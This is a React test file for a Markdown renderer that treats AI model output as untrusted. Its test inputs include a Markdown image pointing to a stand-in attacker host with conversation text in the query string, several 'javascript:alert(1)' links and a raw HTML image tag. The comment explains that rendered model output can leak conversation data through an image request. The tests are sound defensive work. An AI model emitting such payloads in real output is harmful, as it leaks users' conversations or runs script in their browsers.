import { describe, expect, it } from 'vitest';
import { render } from '@testing-library/react';
import { Markdown } from './markdown';

/**
 * Model output is untrusted. These cover the two ways rendered Markdown can
 * act on the reader's behalf without a click: a remote image (a request that
 * can carry conversation text in its URL) and a script-bearing link.
 */
describe('Markdown — untrusted model output', () => {
  it('never renders a remote image, so nothing is fetched on render', () => {
    const { container } = render(
      <Markdown content="Look: ![chart](https://attacker.example/pixel.png?q=secret-conversation)" />,
    );

    expect(container.querySelector('img')).toBeNull();
    const link = container.querySelector('a.md-image-ref');
    expect(link).not.toBeNull();
    expect(link).toHaveTextContent('[Image: chart]');
    expect(link).toHaveAttribute('rel', expect.stringContaining('noopener'));
  });

  it('drops an image with an unsafe scheme to inert text', () => {
    const { container } = render(<Markdown content="![x](javascript:alert(1))" />);
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('a')).toBeNull();
    expect(container).toHaveTextContent('[x]');
  });

  it('renders a javascript: link as plain text', () => {
    const { container } = render(<Markdown content="[click](javascript:alert(1))" />);
    expect(container.querySelector('a')).toBeNull();
    expect(container).toHaveTextContent('click');
  });

  it('treats raw HTML as text, not markup', () => {
    const { container } = render(<Markdown content={'<img src="https://x.example/a.png">'} />);
    expect(container.querySelector('img')).toBeNull();
  });
});
